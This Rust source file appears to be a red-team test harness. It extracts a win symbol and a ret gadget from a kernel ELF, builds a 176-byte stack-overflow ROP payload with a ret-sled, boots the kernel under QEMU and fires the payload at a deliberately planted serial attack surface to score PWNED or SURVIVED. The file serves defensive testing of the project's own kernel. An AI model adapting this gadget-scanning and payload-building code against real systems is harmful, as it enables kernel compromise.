//! redteam_attack — fire a REAL ROP chain at a live kernel under QEMU.
//!
//! Not a simulation. This driver:
//!   1. Parses the kernel ELF for the `attack_win` symbol and a `ret`
//!      gadget byte — the same address intelligence a real attacker
//!      extracts from a leaked image.
//!   2. Builds a 512-byte overflow payload: 64 bytes of filler, a
//!      ret-sled of repeated gadget addresses, and the `attack_win`
//!      address on top — a classic stack-smash chain delivered to the
//!      kernel's planted serial attack surface.
//!   3. Packages the ELF into a bootable image, boots it under QEMU
//!      with COM1 on a TCP socket, waits for the `ATK IFACE UP` banner,
//!      and fires the payload.
//!   4. Verdict: `PWNED` on the serial log = the chain executed
//!      (red wins). Anything else = the kernel survived (blue wins).
//!
//! Usage:
//!   redteam_attack <kernel.elf> <workdir> <port> [--payload-only] [--intel <elf>]
//!       --payload-only: just build payload.bin from the ELF (no QEMU).
//!       --intel <elf>:  extract gadget/win addresses from THIS image
//!                       (the attacker's knowledge), while firing at
//!                       <kernel.elf> (the target). This is the
//!                       stockpiled-exploit model: chain built on cycle
//!                       N, fired at cycle N+1.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::thread;
use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use object::{Object, ObjectSection, ObjectSymbol, SymbolKind};

const READ_LEN: usize = 176;
const BUF_LEN: usize = 64;

/// Boot-time relocation base: the bootloader maps the kernel image at
/// `0x0000_0100_0000_0000` + ELF virtual address (observed in QEMU
/// exception dumps: RIP = 0x00000100_00037117 when executing ELF
/// 0x37117). Every address in the payload must be relocated by this —
/// the exact adjustment a real attacker needs a leak (or the image +
/// loader knowledge) to make.
const BOOT_VMA_BASE: u64 = 0x0000_0100_0000_0000;

/// Attacker's address intelligence: attack_win symbol + one ret gadget.
struct Intel {
    win: u64,
    ret_gadget: u64,
}

fn extract_intel(elf: &Path) -> Result<Intel> {
    let data = std::fs::read(elf).with_context(|| format!("read {}", elf.display()))?;
    let obj = object::File::parse(&*data).context("parse ELF")?;

    let mut win = None;
    for sym in obj.symbols() {
        if sym.kind() == SymbolKind::Text && sym.name().ok() == Some("attack_win") {
            win = Some(sym.address());
        }
    }
    let win = win.context("attack_win symbol not found in ELF (harness built in?)")?;

    // Any 0xC3 byte in an executable section decodes as `ret` when the
    // CPU lands on it — the canonical sled gadget.
    let mut ret_gadget = None;
    for sec in obj.sections() {
        let name = sec.name().unwrap_or("");
        if !name.starts_with(".text") {
            continue;
        }
        let bytes = sec.data().unwrap_or(&[]);
        if let Some(off) = bytes.iter().position(|&b| b == 0xC3) {
            ret_gadget = Some(sec.address() + off as u64);
            break;
        }
    }
    let ret_gadget = ret_gadget.context("no 0xC3 byte found in .text")?;

    Ok(Intel { win, ret_gadget })
}

fn build_payload(intel: &Intel) -> Vec<u8> {
    let ret = BOOT_VMA_BASE + intel.ret_gadget;
    let win = BOOT_VMA_BASE + intel.win;
    eprintln!("redteam: relocated win={:#x} ret={:#x}", win, ret);
    let mut p = vec![0x41u8; BUF_LEN]; // filler over the 64-byte buffer
    // Ret-sled: every qword from the first overwritten slot to the last
    // is the ret gadget; the final qword is the win target. Wherever the
    // true saved-return-address slot lies inside the sled, RIP walks
    // forward one qword per `ret` until it lands on `attack_win`.
    let sled_qwords = (READ_LEN - BUF_LEN) / 8 - 1;
    for _ in 0..sled_qwords {
        p.extend_from_slice(&ret.to_le_bytes());
    }
    p.extend_from_slice(&win.to_le_bytes());
    debug_assert_eq!(p.len(), READ_LEN);
    p
}

fn wait_for(buf: &std::sync::Arc<std::sync::Mutex<Vec<u8>>>, needle: &str, timeout: Duration) -> bool {
    let start = Instant::now();
    while start.elapsed() < timeout {
        {
            let b = buf.lock().unwrap();
            if b.windows(needle.len()).any(|w| w == needle.as_bytes()) {
                return true;
            }
        }
        thread::sleep(Duration::from_millis(100));
    }
    false
}

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    let elf = args.get(1).context("usage: redteam_attack <elf> <workdir> <port> [--payload-only]")?;
    let work = args.get(2).context("workdir required")?;
    let port: u16 = args.get(3).context("port required")?.parse()?;
    let payload_only = args.iter().any(|a| a == "--payload-only");
    let intel_elf: PathBuf = match args.iter().position(|a| a == "--intel") {
        Some(i) => PathBuf::from(args.get(i + 1).context("--intel needs a path")?),
        None => PathBuf::from(elf),
    };

    let elf_path = std::fs::canonicalize(elf).context("canonicalize elf path")?;
    let work_path = PathBuf::from(work);
    std::fs::create_dir_all(&work_path)?;
    let work_path = std::fs::canonicalize(&work_path)?;

    let intel = extract_intel(&intel_elf)?;
    eprintln!(
        "redteam: intel win={:#x} ret_gadget={:#x}",
        intel.win, intel.ret_gadget
    );
    let payload = build_payload(&intel);
    let payload_path = work_path.join("payload.bin");
    std::fs::write(&payload_path, &payload)?;

    if payload_only {
        let pp = work_path.join("payload.bin");
        std::fs::write(&pp, &payload)?;
        println!("payload written to {}", pp.display());
        return Ok(());
    }

    // Package the ELF into a bootable BIOS image. factory_builder is a
    // sibling of this example binary (`<profile>/examples/` → `<profile>/`).
    let img = work_path.join("attack.img");
    let self_exe = std::env::current_exe()?;
    let fb = self_exe
        .parent()
        .and_then(|p| p.parent())
        .map(|d| d.join(if cfg!(windows) { "factory_builder.exe" } else { "factory_builder" }))
        .context("locate factory_builder sibling")?;
    let fb_out = Command::new(&fb)
        .arg("--candidate")
        .arg(&elf_path)
        .arg("--out")
        .arg(&img)
        .output()
        .context("spawn factory_builder package")?;
    if !fb_out.status.success() {
        bail!(
            "factory_builder package failed: {}",
            String::from_utf8_lossy(&fb_out.stderr)
        );
    }

    // Scratch disks for the hardware-truth banners (content irrelevant).
    let vd = work_path.join("vd0.img");
    let ahd = work_path.join("ahd0.img");
    let nvm = work_path.join("nvme0.img");
    for d in [&vd, &ahd, &nvm] {
        if !d.exists() {
            std::fs::write(d, vec![0u8; 1 << 20])?;
        }
    }

    let device_key_path = work_path.join("device_secret_key.bin");
    if !device_key_path.exists() {
        use rand::RngCore;
        let mut key = [0u8; 32];
        rand::rngs::OsRng.fill_bytes(&mut key);
        std::fs::write(&device_key_path, key)?;
    }

    let qemu = r"C:\Program Files\qemu\qemu-system-x86_64.exe";
    let qemu = if Path::new(qemu).exists() {
        qemu.to_string()
    } else {
        "qemu-system-x86_64".to_string()
    };
    let mut qproc = Command::new(&qemu)
        .arg("-accel").arg("tcg")
        .arg("-drive").arg(format!("format=raw,file={},if=ide", img.display()))
        .arg("-drive").arg(format!("if=none,id=vd0,format=raw,file={}", vd.display()))
        .arg("-device").arg("virtio-blk-pci,drive=vd0,disable-legacy=off,disable-modern=on")
        .arg("-netdev").arg("hubport,id=n0,hubid=1")
        .arg("-device").arg("virtio-net-pci,netdev=n0,disable-legacy=off,disable-modern=on")
        .arg("-netdev").arg("hubport,id=n1,hubid=1")
        .arg("-device").arg("virtio-net-pci,netdev=n1,disable-legacy=off,disable-modern=on")
        .arg("-drive").arg(format!("if=none,id=ahd0,format=raw,file={}", ahd.display()))
        .arg("-device").arg("ahci,id=ahci0")
        .arg("-device").arg("ide-hd,drive=ahd0,bus=ahci0.0")
        .arg("-netdev").arg("hubport,id=e0,hubid=2")
        .arg("-device").arg("e1000,netdev=e0")
        .arg("-netdev").arg("hubport,id=e1,hubid=2")
        .arg("-device").arg("e1000,netdev=e1")
        .arg("-drive").arg(format!("if=none,id=nvme0,format=raw,file={}", nvm.display()))
        .arg("-device").arg("nvme,drive=nvme0,serial=CUTTLE-NVME-HW")
        .arg("-fw_cfg").arg(format!("name=opt/cuttle_device_key,file={}", device_key_path.display()))
        .arg("-fw_cfg").arg(format!("name=opt/attack.bin,file={}", payload_path.display()))
        .arg("-serial").arg(format!("tcp:127.0.0.1:{},server=on,wait=off", port))
        .arg("-monitor").arg(format!("tcp:127.0.0.1:{},server=on,wait=off", port + 100))
        .arg("-display").arg("none")
        .arg("-no-reboot")
        .arg("-m").arg("256M")
        .arg("-d").arg("int,guest_errors")
        .arg("-D").arg(format!("{}", work_path.join("int.log").display()))
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .context("spawn qemu")?;

    // Connect to the serial socket (retry while QEMU opens the server).
    let mut stream = None;
    for _ in 0..100 {
        match TcpStream::connect(("127.0.0.1", port)) {
            Ok(s) => {
                stream = Some(s);
                break;
            }
            Err(_) => thread::sleep(Duration::from_millis(200)),
        }
    }
    let mut stream = stream.context("could not connect to qemu serial tcp")?;
    stream.set_read_timeout(Some(Duration::from_millis(200)))?;

    // Reader thread: accumulate the serial log.
    let buf = std::sync::Arc::new(std::sync::Mutex::new(Vec::<u8>::new()));
    {
        let buf = buf.clone();
        let mut rs = stream.try_clone()?;
        thread::spawn(move || {
            let mut tmp = [0u8; 4096];
            loop {
                match rs.read(&mut tmp) {
                    Ok(0) => break,
                    Ok(n) => buf.lock().unwrap().extend_from_slice(&tmp[..n]),
                    Err(ref e)
                        if e.kind() == std::io::ErrorKind::WouldBlock
                            || e.kind() == std::io::ErrorKind::TimedOut => {}
                    Err(_) => break,
                }
            }
        });
    }

    // Wait for the attack interface, then fire.
    let boot_ok = wait_for(&buf, "ATK IFACE UP", Duration::from_secs(300));
    let mut verdict = "BOOT_TIMEOUT";
    if boot_ok {
        // Trigger only — the payload itself arrives via fw_cfg
        // (-fw_cfg opt/attack.bin), immune to UART RX drops.
        stream.write_all(b"ATK!")?;
        stream.flush()?;
        eprintln!("redteam: trigger fired; payload is on fw_cfg");
        if wait_for(&buf, "PWNED", Duration::from_secs(20)) {
            verdict = "PWNED";
        } else if wait_for(&buf, "ATK SVC SURVIVED", Duration::from_secs(5)) {
            verdict = "SURVIVED";
        } else {
            // Ambiguous hang: ask the QEMU monitor where RIP actually
            // is — distinguishes "blocked in serial_read_byte" from
            // "chain fired and CPU went into the weeds".
            eprintln!("redteam: no verdict; querying monitor for registers");
            if let Ok(mut mon) = TcpStream::connect(("127.0.0.1", port + 100)) {
                let _ = mon.set_read_timeout(Some(Duration::from_millis(500)));
                thread::sleep(Duration::from_millis(300));
                let mut tmp = [0u8; 8192];
                let _ = mon.read(&mut tmp); // banner
                let _ = mon.write_all(b"info registers\n");
                thread::sleep(Duration::from_millis(500));
                if let Ok(n) = mon.read(&mut tmp) {
                    eprintln!(
                        "redteam: monitor registers:\n{}",
                        String::from_utf8_lossy(&tmp[..n])
                    );
                }
                // Also: did the guest receive any more bytes? Nudge with
                // a top-up in case it is merely starved.
                eprintln!("redteam: sending top-up bytes");
                let mut topup = Vec::new();
                for _ in 0..7 {
                    topup.extend_from_slice(&intel.ret_gadget.to_le_bytes());
                }
                topup.extend_from_slice(&intel.win.to_le_bytes());
                let _ = stream.write_all(&topup);
                let _ = stream.flush();
            }
            if wait_for(&buf, "PWNED", Duration::from_secs(20)) {
                verdict = "PWNED_AFTER_TOPUP";
            } else if wait_for(&buf, "ATK SVC SURVIVED", Duration::from_secs(5)) {
                verdict = "SURVIVED";
            } else if wait_for(&buf, "CUTTLE-TE HALT", Duration::from_secs(5)) {
                verdict = "HALTED_NO_PWN";
            }
        }
    }

    let log_path = work_path.join("attack_serial.log");
    std::fs::write(&log_path, buf.lock().unwrap().as_slice())?;
    let _ = qproc.kill();
    let _ = qproc.wait();

    println!(
        "ATTACK_RESULT elf={} verdict={} log={}",
        elf_path.display(),
        verdict,
        log_path.display()
    );
    Ok(())
}
